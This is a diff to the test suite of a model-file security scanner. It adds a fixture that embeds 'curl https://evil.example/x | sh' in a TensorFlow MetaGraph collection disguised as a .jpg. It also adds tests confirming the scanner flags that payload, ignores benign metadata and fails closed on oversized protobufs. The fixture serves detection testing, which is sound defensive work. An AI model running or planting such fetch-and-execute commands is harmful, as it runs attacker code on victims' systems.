@@ -197,6 +197,20 @@ def _build_collection_only_tf_savedmodel(
     return cast(bytes, saved_model.SerializeToString())
 
 
+def _build_collection_only_tf_metagraph(
+    *,
+    key: str = "runtime_hook",
+    value: bytes = b"curl https://evil.example/x | sh",
+) -> bytes:
+    _require_tf_protos()
+    import modelaudit.protos  # noqa: F401
+
+    meta_graph_pb2 = importlib.import_module("tensorflow.core.protobuf.meta_graph_pb2")
+    metagraph = meta_graph_pb2.MetaGraphDef()
+    metagraph.collection_def[key].bytes_list.value.append(value)
+    return cast(bytes, metagraph.SerializeToString())
+
+
 def _build_malicious_tf_function_metagraph() -> bytes:
     _require_tf_protos()
     import modelaudit.protos  # noqa: F401
@@ -4555,6 +4569,30 @@ def test_scan_file_inspects_renamed_tf_savedmodel_collection_payloads(tmp_path: 
     assert any(check.name == "SavedModel Collection Executable Pattern" for check in result.checks)
 
 
+def test_scan_file_inspects_renamed_tf_metagraph_collection_only_payloads(tmp_path: Path) -> None:
+    disguised_metagraph = tmp_path / "collection-only.jpg"
+    disguised_metagraph.write_bytes(_build_collection_only_tf_metagraph())
+
+    result = scan_file(str(disguised_metagraph), config={"cache_scan_results": False})
+
+    assert result.scanner_name == "tf_metagraph"
+    assert any(check.name == "MetaGraph Collection Executable Pattern" for check in result.checks)
+
+
+def test_scan_file_does_not_flag_benign_renamed_tf_metagraph_collection_metadata(tmp_path: Path) -> None:
+    disguised_metagraph = tmp_path / "benign-collection-only.jpg"
+    disguised_metagraph.write_bytes(
+        _build_collection_only_tf_metagraph(value=b"documentation: https://example.invalid/runtime")
+    )
+
+    result = scan_file(str(disguised_metagraph), config={"cache_scan_results": False})
+
+    assert result.scanner_name == "tf_metagraph"
+    assert result.success is True
+    assert not any(check.name == "MetaGraph Structural Validation" for check in result.checks)
+    assert not any(check.name == "MetaGraph Collection Executable Pattern" for check in result.checks)
+
+
 def test_scan_file_does_not_flag_benign_renamed_tf_savedmodel_collection_metadata(tmp_path: Path) -> None:
     disguised_savedmodel = tmp_path / "benign-collection.jpg"
     disguised_savedmodel.write_bytes(
@@ -4620,6 +4658,37 @@ def test_scan_file_fails_closed_for_incomplete_tf_protobuf_routing_without_cachi
         reset_cache_manager()
 
     aggregate = scan_model_directory_or_file(str(ambiguous_payload), cache_scan_results=False)
+    assert core_module.determine_exit_code(aggregate) == 2
+
+
+@pytest.mark.parametrize(
+    "filename",
+    ["versioned-oversized-field-two.jpg", "versioned-oversized-field-two.py", "versioned-oversized-field-two.pyw"],
+)
+def test_scan_file_keeps_versioned_oversized_protobuf_on_inconclusive_route_without_caching(
+    tmp_path: Path,
+    filename: str,
+) -> None:
+    generic_payload = tmp_path / filename
+    oversized_field_size = _MAX_PARSE_BYTES + 1
+    generic_payload.write_bytes(b"\x08\x01" + b"\x12\x81\x80\x80\x0a" + (b"x" * oversized_field_size))
+    cache_dir = tmp_path / "cache"
+    config = {"cache_enabled": True, "cache_dir": str(cache_dir), "min_cache_file_size": 0}
+
+    reset_cache_manager()
+    try:
+        result = scan_file(str(generic_payload), config=config)
+        repeated_result = scan_file(str(generic_payload), config=config)
+
+        assert result.scanner_name == "unknown"
+        assert result.success is False
+        assert repeated_result.success is False
+        assert result.metadata["operational_error_reason"] == "tensorflow_protobuf_routing_incomplete"
+        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
+    finally:
+        reset_cache_manager()
+
+    aggregate = scan_model_directory_or_file(str(generic_payload), cache_scan_results=False)
     assert core_module.determine_exit_code(aggregate) == 2
 
 
